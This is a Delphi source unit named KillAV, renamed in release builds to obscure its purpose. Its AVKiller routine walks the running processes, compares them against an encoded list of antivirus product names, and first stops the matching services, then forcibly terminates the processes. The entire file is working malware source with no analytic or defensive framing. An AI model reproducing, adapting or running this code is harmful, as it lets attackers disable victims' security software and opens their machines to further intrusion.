   {$I CompMode.INI}

   {$IFDEF Debug}
   UNIT KillAV;
   {$ELSE}
   UNIT A5;
   {$ENDIF}

   INTERFACE

   {$IFDEF Debug}
   USES
     Utils, ACLUtils;
   {$ELSE}
   USES
     A6, B1;
   {$ENDIF}

   {$I Resources\TAVNAME.INI}

   PROCEDURE AVKiller;

   IMPLEMENTATION

   TYPE
     PServiceStatus              = ^TServiceStatus;

     {$EXTERNALSYM _SERVICE_STATUS}
     _SERVICE_STATUS             = RECORD
       dwServiceType             : DWORD;
       dwCurrentState            : DWORD;
       dwControlsAccepted        : DWORD;
       dwWin32ExitCode           : DWORD;
       dwServiceSpecificExitCode : DWORD;
       dwCheckPoint              : DWORD;
       dwWaitHint                : DWORD;
     END;
     {$EXTERNALSYM SERVICE_STATUS}

     SERVICE_STATUS              = _SERVICE_STATUS;
     TServiceStatus              = _SERVICE_STATUS;

   CONST
     SC_MANAGER_ALL_ACCESS       = ({STANDARD_RIGHTS_REQUIRED}$000F0000 OR
                                    {SC_MANAGER_CONNECT}$0001 OR
                                    {SC_MANAGER_CREATE_SERVICE}$0002 OR
                                    {SC_MANAGER_ENUMERATE_SERVICE}$0004 OR
                                    {SC_MANAGER_LOCK}$0008 OR
                                    {SC_MANAGER_QUERY_LOCK_STATUS}$0010 OR
                                    {SC_MANAGER_MODIFY_BOOT_CONFIG}$0020);
     SERVICE_ALL_ACCESS          = ({STANDARD_RIGHTS_REQUIRED}$000F0000 OR
                                    {SERVICE_QUERY_CONFIG}$0001 OR
                                    {SERVICE_CHANGE_CONFIG}$0002 OR
                                    {SERVICE_QUERY_STATUS}$0004 OR
                                    {SERVICE_ENUMERATE_DEPENDENTS}$0008 OR
                                    {SERVICE_START}$0010 OR
                                    {SERVICE_STOP}$0020 OR
                                    {SERVICE_PAUSE_CONTINUE}$0040 OR
                                    {SERVICE_INTERROGATE}$0080 OR
                                    {SERVICE_USER_DEFINED_CONTROL}$0100);

   FUNCTION OpenSCManager(pMachineName,lpDatabaseName:PChar;dwDesiredAccess:DWORD) : THANDLE; STDCALL; EXTERNAL 'advapi32.dll' Name 'OpenSCManagerA';
   FUNCTION OpenService(hSCManager:THANDLE;lpServiceName:PChar;dwDesiredAccess:DWORD) : THANDLE; STDCALL; EXTERNAL 'advapi32.dll' Name 'OpenServiceA';
   FUNCTION ControlService(hService:THANDLE; dwControl:DWORD;VAR lpServiceStatus:TServiceStatus): LongBOOL; STDCALL; EXTERNAL 'advapi32.dll' Name 'ControlService';
   FUNCTION CloseServiceHandle(hSCObject:THANDLE) : LongBOOL; STDCALL; EXTERNAL 'advapi32.dll' name 'CloseServiceHandle';

   PROCEDURE CloseService(ServName:STRING);
   VAR
     hSCM     : DWORD;
     hService : DWORD;
     ss       : TServiceStatus;
   BEGIN
     hSCM:=OpenSCManager(NIL,NIL,SC_MANAGER_ALL_ACCESS);
     hService:=OpenService(hSCM,pchar(servname),Service_all_access);
     ControlService(hService,{SERVICE_CONTROL_STOP}$00000001,ss);
     CloseServiceHandle(hSCM);
     CloseServiceHandle(hService);
   END;

   PROCEDURE AVKiller;
   VAR
     ContinueLoop    : BOOL;
     FSnapshotHandle : THandle;
     FProcessEntry32 : TProcessEntry32;
     I               : WORD;
     J               : BYTE;
   BEGIN
     FOR J:=1 TO 2 DO BEGIN
       FSnapshotHandle:=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
       FProcessEntry32.dwSize:=Sizeof(FProcessEntry32);
       ContinueLoop:=Process32First(FSnapshotHandle,FProcessEntry32);
       WHILE ContinueLoop DO BEGIN FOR I:=1 TO ItemsCountInEncodedString(TAVNAME) DO
         IF (Pos(UpperCase(ExtractFileName(STRING(FProcessEntry32.szExeFile))),DecodeString(I,TAVNAME))>0)OR(Pos(UpperCase(FProcessEntry32.szExeFile),DecodeString(I,TAVNAME))>0) THEN BEGIN
           IF J=1 THEN CloseService(FProcessEntry32.szExeFile) ELSE TerminateProcess(OpenProcess(1,False,FProcessEntry32.th32ProcessID),0);
         END;
         ContinueLoop:=Process32Next(FSnapshotHandle,FProcessEntry32);
       END;
       CloseHandle(FSnapshotHandle);
     END;
   END;

   END.
